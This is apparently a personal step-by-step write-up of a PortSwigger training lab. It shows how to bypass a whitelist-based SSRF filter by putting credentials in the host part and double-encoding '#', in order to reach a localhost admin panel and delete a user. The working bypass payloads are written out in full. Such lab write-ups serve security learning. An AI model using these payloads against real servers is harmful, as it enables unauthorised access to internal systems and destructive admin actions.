https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass.


1) try to access /admin and we obtain a message that says that the page can be accessed only by administrators or from the loopback


2) perform a request to see if a product is in the stock to  POST /product/stock

    we can see that this performs a request to an API 

    so change the endpoint of the api in the body to:
    stockAPI=http://localhost
    
    BUT we obtain "External stock check host must be stock.weliketoshop.net"

    
3) try to insert in body http://127.0.0.1@stock.weliketoshop.net/
    we obtain an internal server error 500, this because the server try to perform the access as 127.0.0.1@stock.weliketoshop.net

    so try to bypass the filter and not perform the "access"
    127.0.0.1#@stock.weliketoshop.net but it is validated so URL econde the # double time


    127.0.0.1%2523@stock.weliketoshop.net
     


3) try to access to the admin panel /admin changing the POST body to
    stockAPI=http://127.0.0.1%2523@stock.weliketoshop.net/admin
    
    it works


4) delete carlos 
    stockAPI=http://127.0.0.1%2523@stock.weliketoshop.net/admin/delete?username=carlos
    


